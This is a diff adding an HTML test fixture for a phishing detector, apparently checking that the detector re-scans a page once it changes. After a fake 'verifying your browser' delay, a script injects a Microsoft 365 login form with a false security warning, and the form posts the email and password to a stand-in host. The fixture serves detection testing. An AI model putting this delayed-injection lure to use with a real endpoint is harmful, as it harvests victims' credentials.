@@ -1,0 +1,33 @@
+<!doctype html>
+<!-- TEST FIXTURE: starts as a harmless "loading" screen and injects a Microsoft-
+     branded login form after 2 seconds, like kits that hide behind a fake CAPTCHA.
+     Tests the content script's MutationObserver re-scan. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Document shared with you</title>
+  <style>
+    body { font-family: "Segoe UI", Arial, sans-serif; background: #f2f2f2; margin: 0; }
+    .box { max-width: 420px; margin: 80px auto; background: #fff; padding: 36px; box-shadow: 0 2px 6px rgba(0,0,0,.2); }
+    h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px; }
+    input { width: 100%; padding: 8px 0; border: 0; border-bottom: 1px solid #666; margin: 10px 0; font-size: 15px; }
+    button { background: #0067b8; color: #fff; border: 0; padding: 8px 32px; float: right; font-size: 15px; }
+    .fixture { clear: both; text-align: center; font-size: 11px; color: #999; padding-top: 40px; }
+  </style>
+</head>
+<body>
+  <div class="box" id="box"><p>Verifying your browser… please wait.</p></div>
+  <script>
+    setTimeout(function () {
+      document.getElementById('box').innerHTML =
+        '<h1>Sign in to Microsoft 365</h1>' +
+        '<p>Unusual sign-in activity was detected. Confirm your password to view the shared OneDrive document.</p>' +
+        '<form action="https://collector.invalid/o365.php" method="post">' +
+        '<input type="email" name="u" placeholder="Email, phone, or Skype">' +
+        '<input type="password" name="p" placeholder="Password">' +
+        '<button type="submit">Sign in</button></form>' +
+        '<p class="fixture">Verano PhishGuard test fixture, not a real login page.</p>';
+    }, 2000);
+  </script>
+</body>
+</html>
